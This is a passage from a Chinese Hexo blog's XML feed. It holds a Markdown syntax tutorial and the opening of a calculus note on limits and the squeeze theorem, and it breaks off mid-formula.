      <categories>
          
          <category> common </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown语法</title>
      <link href="/2020/06/04/markdown/"/>
      <url>/2020/06/04/markdown/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>markdown用法简介</p></blockquote><a id="more"></a><h2 id="标题"><a class="markdownIt-Anchor" href="#标题"></a> 标题</h2><ul><li>标题间没有横岗</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br></pre></td></tr></table></figure><ul><li>分级标题，= - 最少可以只写一个，兼容性一般</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一级标题</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">二级标题</span><br><span class="line">---------------------</span><br></pre></td></tr></table></figure><ul><li>TOC：根据标题生成目录，兼容性一般</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[TOC]</span><br></pre></td></tr></table></figure><h2 id="字体"><a class="markdownIt-Anchor" href="#字体"></a> 字体</h2><h3 id="语义标记"><a class="markdownIt-Anchor" href="#语义标记"></a> 语义标记</h3><table><thead><tr><th>描述</th><th>效果</th><th>代码</th></tr></thead><tbody><tr><td>斜体</td><td><em>斜体</em></td><td><code>*斜体*</code></td></tr><tr><td>斜体</td><td><em>斜体</em></td><td><code>_斜体_</code></td></tr><tr><td>加粗</td><td><strong>加粗</strong></td><td><code>**加粗**</code></td></tr><tr><td>加粗+斜体</td><td><em><strong>加粗+斜体</strong></em></td><td><code>***加粗+斜体***</code></td></tr><tr><td>加粗+斜体</td><td><strong><em>加粗+斜体</em></strong></td><td><code>**_加粗+斜体_**</code></td></tr><tr><td>删除线</td><td><s>删除线</s></td><td><code>~~删除线~~</code></td></tr></tbody></table><h3 id="语义标签"><a class="markdownIt-Anchor" href="#语义标签"></a> 语义标签</h3><table><thead><tr><th>描述</th><th>效果</th><th>代码</th></tr></thead><tbody><tr><td>斜体</td><td><i>斜体</i></td><td><code>&lt;i&gt;斜体&lt;/i&gt;</code></td></tr><tr><td>加粗</td><td><b>加粗</b></td><td><code>&lt;b&gt;加粗&lt;/b&gt;</code></td></tr><tr><td>强调</td><td><em>强调</em></td><td><code>&lt;em&gt;强调&lt;/em&gt;</code></td></tr><tr><td>上标</td><td>Z<sup>a</sup></td><td><code>Z&lt;sup&gt;a&lt;/sup&gt;</code></td></tr><tr><td>下标</td><td>Z<sub>a</sub></td><td><code>Z&lt;sub&gt;a&lt;/sub&gt;</code></td></tr><tr><td>键盘文本</td><td><kbd>Ctrl</kbd></td><td><code>&lt;kbd&gt;Ctrl&lt;/kbd&gt;</code></td></tr><tr><td>换行</td><td></td><td></td></tr></tbody></table><h2 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h2><ul><li>在引用的文字前加&gt;即可。引用也可以嵌套，如加两个&gt;&gt;三个&gt;&gt;&gt;n个…</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;这是引用的内容</span><br><span class="line">&gt;也是引用的内容</span><br><span class="line">或者引用的内容</span><br><span class="line">&gt;&gt;这是引用的内容</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;这是引用的内容</span><br></pre></td></tr></table></figure><h2 id="分割线"><a class="markdownIt-Anchor" href="#分割线"></a> 分割线</h2><ul><li>三个或者三个以上的 - 或者 * 都可以。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ---</span><br><span class="line"># ----</span><br><span class="line"># ***</span><br><span class="line"># *****</span><br><span class="line"># 井号和空格是我防止格式变化的，实际中去掉就行</span><br></pre></td></tr></table></figure><h2 id="图片"><a class="markdownIt-Anchor" href="#图片"></a> 图片</h2><ul><li>普通图片</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![图片alt](图片地址 &#39;&#39;图片title&#39;&#39;)</span><br><span class="line"># 图片alt就是显示在图片下面的文字，相当于对图片内容的解释。</span><br><span class="line"># 图片title是图片的标题，当鼠标移到图片上时显示的内容。title可#加可不加</span><br></pre></td></tr></table></figure><ul><li>插入图片带有链接</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[图片上传失败...(image-f83b77-1542510791300)]](http:&#x2F;&#x2F;www.baidu.com)&#123;:target&#x3D;&quot;_blank&quot;&#125;       &#x2F;&#x2F; 内链式</span><br><span class="line"></span><br><span class="line">[[图片上传失败...(image-4dc956-1542510791300)]][5]&#123;:target&#x3D;&quot;_blank&quot;&#125;                      &#x2F;&#x2F; 引用式</span><br><span class="line">[5]: http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure><h2 id="超链接"><a class="markdownIt-Anchor" href="#超链接"></a> 超链接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[超链接名](超链接地址 &quot;超链接title&quot;)</span><br><span class="line"># title可加可不加</span><br></pre></td></tr></table></figure><h2 id="视频插入"><a class="markdownIt-Anchor" href="#视频插入"></a> 视频插入</h2><ul><li>Markdown 语法是不支持直接插入视频的</li><li>普遍的做法是 插入HTML的 iframe 框架，通过网站自带的分享功能获取</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe height&#x3D;498 width&#x3D;510 src&#x3D;&#39;http:&#x2F;&#x2F;player.youku.com&#x2F;embed&#x2F;XMjgzNzM0NTYxNg&#x3D;&#x3D;&#39; frameborder&#x3D;0 &#39;allowfullscreen&#39;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-9.png" alt="iframe生成" /></p><ul><li>第二是伪造播放界面，实质是插入视频图片，然后通过点击跳转到相关页面</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[图片上传失败...(image-49aefe-1542510791300)]](http:&#x2F;&#x2F;v.youku.com&#x2F;v_show&#x2F;id_XMjgzNzM0NTYxNg&#x3D;&#x3D;.html?spm&#x3D;a2htv.20009910.contentHolderUnit2.A&amp;from&#x3D;y1.3-tv-grid-1007-9910.86804.1-2#paction)&#123;:target&#x3D;&quot;_blank&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="列表"><a class="markdownIt-Anchor" href="#列表"></a> 列表</h2><h3 id="无序列表"><a class="markdownIt-Anchor" href="#无序列表"></a> 无序列表</h3><ul><li>无序列表用 - + * 任何一种都可以</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 列表内容</span><br><span class="line">+ 列表内容</span><br><span class="line">* 列表内容</span><br><span class="line"># 注意：- + * 跟内容之间都要有一个空格</span><br></pre></td></tr></table></figure><h3 id="有序列表"><a class="markdownIt-Anchor" href="#有序列表"></a> 有序列表</h3><ul><li>数字加点</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 列表内容</span><br><span class="line">2. 列表内容</span><br><span class="line">3. 列表内容</span><br><span class="line"># 注意：序号跟内容之间要有空格</span><br></pre></td></tr></table></figure><h3 id="列表嵌套"><a class="markdownIt-Anchor" href="#列表嵌套"></a> 列表嵌套</h3><ul><li>上一级和下一级之间敲三个空格即可</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 1   </span><br><span class="line">  - 1.1</span><br><span class="line">  </span><br></pre></td></tr></table></figure><h2 id="表格"><a class="markdownIt-Anchor" href="#表格"></a> 表格</h2><h3 id="普通表格"><a class="markdownIt-Anchor" href="#普通表格"></a> 普通表格</h3><ul><li><code>:</code> 代表对齐方式 , <code>:</code> 与 <code>|</code> 之间不要有空格，否则对齐会有些不兼容</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">表头|表头|表头</span><br><span class="line">---|:--:|---:</span><br><span class="line">内容|内容|内容</span><br><span class="line">内容|内容|内容</span><br><span class="line"># 第二行分割表头和内容。</span><br><span class="line"># - 有一个就行，为了对齐，多加了几个</span><br><span class="line"># 文字默认居左</span><br><span class="line"># -两边加：表示文字居中</span><br><span class="line"># -右边加：表示文字居右</span><br><span class="line"># 注：原生的语法两边都要用 | 包起来。此处省略</span><br><span class="line">a  | b | c  </span><br><span class="line">:-:|:- |-:</span><br><span class="line">    居中    |     左对齐      |   右对齐    </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h3 id="特殊表格"><a class="markdownIt-Anchor" href="#特殊表格"></a> 特殊表格</h3><ul><li>一般对合并单元格，以及其他特殊格式表格，markdown 是无能为力的，不过可以在线生成HTML代码 <a href="http://www.tablesgenerator.com">Tables Generator</a> (国外的站)，使用HTML标签。</li></ul><h2 id="代码"><a class="markdownIt-Anchor" href="#代码"></a> 代码</h2><ul><li>单行代码：代码之间分别用一个反引号包起来</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;代码内容&#96;</span><br></pre></td></tr></table></figure><ul><li>代码块：代码之间分别用三个反引号包起来，且两边的反引号单独占一行</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#96;&#96;&#96;)</span><br><span class="line">  代码...</span><br><span class="line">  代码...</span><br><span class="line">  代码...</span><br><span class="line">(&#96;&#96;&#96;)</span><br></pre></td></tr></table></figure><h2 id="任务列表"><a class="markdownIt-Anchor" href="#任务列表"></a> 任务列表</h2><ul><li>兼容性一般 要隔开一行</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这是文字……</span><br><span class="line"></span><br><span class="line">- [x] 选项一</span><br><span class="line">- [ ] 选项二  </span><br><span class="line">- [ ]  [选项3]</span><br></pre></td></tr></table></figure><h2 id="表情"><a class="markdownIt-Anchor" href="#表情"></a> 表情</h2><ul><li><a href="https://www.webpagefx.com/tools/emoji-cheat-sheet/'GitHub'">表情代码地址</a><br /><img src="/images/pasted-10.png" alt="表情" /></li></ul><h2 id="样式"><a class="markdownIt-Anchor" href="#样式"></a> 样式</h2><ul><li>支持内嵌CSS样式</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p style&#x3D;&quot;color: #AD5D0F;font-size: 30px; font-family: &#39;宋体&#39;;&quot;&gt;内联样式&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><h3 id="更改字体-大小-颜色"><a class="markdownIt-Anchor" href="#更改字体-大小-颜色"></a> 更改字体、大小、颜色</h3><p><font face="黑体">我是黑体字</font><br /><font face="微软雅黑">我是微软雅黑</font><br /><font face="STCAIYUN">我是华文彩云</font><br /><font color=red>我是红色</font><br /><font color=#008000>我是绿色</font><br /><font color=Blue>我是蓝色</font><br /><font size=5>我是尺寸</font><br /><font face="黑体" color=green size=5>我是黑体，绿色，尺寸为5</font></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;font face&#x3D;&quot;黑体&quot;&gt;我是黑体字&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font face&#x3D;&quot;微软雅黑&quot;&gt;我是微软雅黑&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font face&#x3D;&quot;STCAIYUN&quot;&gt;我是华文彩云&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font color&#x3D;red&gt;我是红色&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font color&#x3D;#008000&gt;我是绿色&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font color&#x3D;Blue&gt;我是蓝色&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font size&#x3D;5&gt;我是尺寸&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font face&#x3D;&quot;黑体&quot; color&#x3D;green size&#x3D;5&gt;我是黑体，绿色，尺寸为5&lt;&#x2F;font&gt;</span><br></pre></td></tr></table></figure><h2 id="流程图"><a class="markdownIt-Anchor" href="#流程图"></a> 流程图</h2><ul><li><p>流程图分为两个部分： <code>定义参数</code> 然后 <code>连接参数</code></p><ul><li>定义格式：<code>tag=&gt;type: content:&gt;url</code></li></ul></li></ul><table><thead><tr><th>格式名称</th><th>说明</th></tr></thead><tbody><tr><td>tag</td><td>标签 (可以自定义)</td></tr><tr><td>=&gt;</td><td>赋值</td></tr><tr><td>type</td><td>类型 (6种类型)：start启动;end结束;operation程序;subroutine子程序;condition条件;inputoutput输出</td></tr><tr><td>content</td><td>描述内容 (可以自定义)</td></tr><tr><td>:&gt;url</td><td>链接与跳转方式 兼容性很差</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">st&#x3D;&gt;start: 开始:&gt;http:&#x2F;&#x2F;www.baidu.com[blank]  &#x2F;&#x2F;示例</span><br><span class="line"># &#96;st&#x3D;&gt;start:&#96; 开始 的&#96;：&#96;后面保持空格</span><br></pre></td></tr></table></figure><ul><li>连接格式：<code>st-&gt;c1(yes,right)-&gt;c2(yes,right)-&gt;c3(yes,right)-&gt;io-&gt;e</code></li><li>operation (程序); subroutine (子程序) ;condition (条件)，都可以在括号里加入连接方向。</li></ul><table><thead><tr><th>格式名称</th><th>说明</th></tr></thead><tbody><tr><td>-&gt;</td><td>连接</td></tr><tr><td>condition</td><td>条件</td></tr><tr><td>(布尔值,方向)</td><td>如果满足向右连接，4种方向：right ，left，up ，down 默认为：down</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">开始-&gt;判断条件1为no-&gt;判断条件2为no-&gt;判断条件3为no-&gt;输出-&gt;结束</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#96;&#96;&#96;flow)</span><br><span class="line">st&#x3D;&gt;start: 开始</span><br><span class="line">op&#x3D;&gt;operation: My Operation</span><br><span class="line">cond&#x3D;&gt;condition: Yes or No?</span><br><span class="line">e&#x3D;&gt;end</span><br><span class="line">st-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op</span><br><span class="line">(&#96;&#96;&#96;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#96;&#96;&#96;flow  )                   &#x2F;&#x2F; 流程</span><br><span class="line">st&#x3D;&gt;start: 开始|past:&gt; http:&#x2F;&#x2F;www.baidu.com &#x2F;&#x2F; 开始</span><br><span class="line">e&#x3D;&gt;end: 结束              &#x2F;&#x2F; 结束</span><br><span class="line">c1&#x3D;&gt;condition: 条件1:&gt;http:&#x2F;&#x2F;www.baidu.com[_parent]   &#x2F;&#x2F; 判断条件</span><br><span class="line">c2&#x3D;&gt;condition: 条件2      &#x2F;&#x2F; 判断条件</span><br><span class="line">c3&#x3D;&gt;condition: 条件3      &#x2F;&#x2F; 判断条件</span><br><span class="line">io&#x3D;&gt;inputoutput: 输出     &#x2F;&#x2F; 输出</span><br><span class="line">&#x2F;&#x2F;----------------以上为定义参数-------------------------</span><br><span class="line">&#x2F;&#x2F;----------------以下为连接参数-------------------------</span><br><span class="line">&#x2F;&#x2F; 开始-&gt;判断条件1为no-&gt;判断条件2为no-&gt;判断条件3为no-&gt;输出-&gt;结束</span><br><span class="line">st-&gt;c1(yes,right)-&gt;c2(yes,right)-&gt;c3(yes,right)-&gt;io-&gt;e</span><br><span class="line">c1(no)-&gt;e                   &#x2F;&#x2F; 条件1不满足-&gt;结束</span><br><span class="line">c2(no)-&gt;e                   &#x2F;&#x2F; 条件2不满足-&gt;结束</span><br><span class="line">c3(no)-&gt;e                   &#x2F;&#x2F; 条件3不满足-&gt;结束</span><br><span class="line">(&#96;&#96;&#96;)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-13.png" alt="流程图" /></p><h2 id="脚注"><a class="markdownIt-Anchor" href="#脚注"></a> 脚注</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Markdown[^1]</span><br><span class="line">[^1]: Markdown是一种纯文本标记语言        &#x2F;&#x2F; 在文章最后面显示脚注</span><br></pre></td></tr></table></figure><h2 id="锚点"><a class="markdownIt-Anchor" href="#锚点"></a> 锚点</h2><ul><li>只有标题支持锚点， 跳转目录方括号后 保持空格</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[公式标题锚点](#1)</span><br><span class="line">### [需要跳转的目录] &#123;#1&#125;    &#x2F;&#x2F; 方括号后保持空格</span><br></pre></td></tr></table></figure><h2 id="定义型列表"><a class="markdownIt-Anchor" href="#定义型列表"></a> 定义型列表</h2><ul><li>解释型定义</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Markdown </span><br><span class="line">:   轻量级文本标记语言，可以转换成html，pdf等格式  &#x2F;&#x2F;  开头一个&#96;:&#96; + &#96;Tab&#96; 或 四个空格</span><br><span class="line">代码块定义</span><br><span class="line">:   代码块定义……</span><br><span class="line">        var a &#x3D; 10;         &#x2F;&#x2F; 保持空一行与 递进缩进</span><br></pre></td></tr></table></figure><h2 id="自动邮箱链接"><a class="markdownIt-Anchor" href="#自动邮箱链接"></a> 自动邮箱链接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;xxx@outlook.com&gt;</span><br></pre></td></tr></table></figure><h2 id="时序图"><a class="markdownIt-Anchor" href="#时序图"></a> 时序图</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#96;&#96;&#96;sequence)</span><br><span class="line">A-&gt;&gt;B: 你好</span><br><span class="line">Note left of A: 我在左边     &#x2F;&#x2F; 注释方向，只有左右，没有上下</span><br><span class="line">Note right of B: 我在右边</span><br><span class="line">B--&gt;A: 很高兴认识你</span><br><span class="line">(&#96;&#96;&#96;)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-12.png" alt="时序图1" /></p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>-</td><td>实线</td></tr><tr><td>&gt;</td><td>实心箭头</td></tr><tr><td>–</td><td>虚线</td></tr><tr><td>&gt;&gt;</td><td>空心箭头</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#96;&#96;&#96;sequence)</span><br><span class="line">起床-&gt;吃饭: 稀饭油条</span><br><span class="line">吃饭-&gt;上班: 不要迟到了</span><br><span class="line">上班-&gt;午餐: 吃撑了</span><br><span class="line">上班-&gt;下班:</span><br><span class="line">Note right of 下班: 下班了</span><br><span class="line">下班-&gt;回家:</span><br><span class="line">Note right of 回家: 到家了</span><br><span class="line">回家--&gt;&gt;起床:</span><br><span class="line">Note left of 起床: 新的一天</span><br><span class="line">(&#96;&#96;&#96;)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-11.png" alt="时序图2" /></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> common </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微积分</title>
      <link href="/2020/06/04/%E5%BE%AE%E7%A7%AF%E5%88%86/"/>
      <url>/2020/06/04/%E5%BE%AE%E7%A7%AF%E5%88%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>数学这个学科是一个神奇的学科，永远看不到边界在哪里。</p></blockquote><a id="more"></a><h3 id="函数逼近"><a class="markdownIt-Anchor" href="#函数逼近"></a> 函数逼近</h3><ul><li>逼近是人类探讨复杂问题时的一种手段，微分学就是局部线性化，就是逼近，是微分学的核心思想，用简单的东西模拟复杂的东西。<ul><li><strong>人均GDP</strong>：使用常数函数来逼近收入分布函数；</li><li><strong>平均速度</strong>：使用线性函数来逼近实际运动轨迹；</li></ul></li><li>微分学的核心思想就是用熟悉且简单的函数对复杂函数进行<font color=red>局部</font>逼近。</li><li>常用作逼近的简单函数：<ol><li>线性函数：函数的一阶导数</li><li>多项式函数：泰勒级数</li></ol></li><li>极限的表述方式<ul><li>自然语言：当<code>x</code>趋向于a时，<code>f(x)</code>的极限是L</li><li>数学符号：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>x</mi><mo>→</mo><mi>a</mi></mrow></msub><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">\lim_{x \to a} f(x)=L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">→</span><span class="mord mathdefault mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span></span></span></span></li><li>标准语言：对于任意的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\epsilon&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，存在一个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\delta&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，使得对于任何的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>∈</mo><mo stretchy="false">(</mo><mi>a</mi><mo>−</mo><mi>δ</mi><mo separator="true">,</mo><mi>a</mi><mo>+</mo><mi>δ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x\in(a-\delta,a+\delta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mclose">)</span></span></span></span>，都有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">∣</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>−</mo><mi>L</mi><mo stretchy="false">∣</mo><mo>&lt;</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\lvert f(x)-L \rvert&lt;\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">∣</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mclose">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></li></ul></li></ul><h3 id="极限论"><a class="markdownIt-Anchor" href="#极限论"></a> 极限论</h3><h4 id="无穷小"><a class="markdownIt-Anchor" href="#无穷小"></a> 无穷小</h4><ul><li>无穷小：一般吧趋于零的极限成为无穷小</li><li>无穷小阶数：趋于零的速度越快的无穷小，阶数越高。</li></ul><h4 id="两边夹定理"><a class="markdownIt-Anchor" href="#两边夹定理"></a> 两边夹定理</h4><ul><li><p>如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>&lt;</mo><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>&lt;</mo><mi>h</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)&lt;g(x)&lt;h(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>，而且这三个函数都在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>点处有极限，那么<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>x</mi><mo>→</mo><mi>a</mi></mrow></msub><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>≤</mo><msub><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>x</mi><mo>→</mo><mi>a</mi></mrow></msub><mrow><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><mo>≤</mo><msub><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>x</mi><mo>→</mo><mi>a</mi></mrow></msub><mrow><mi>h</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mrow><annotation 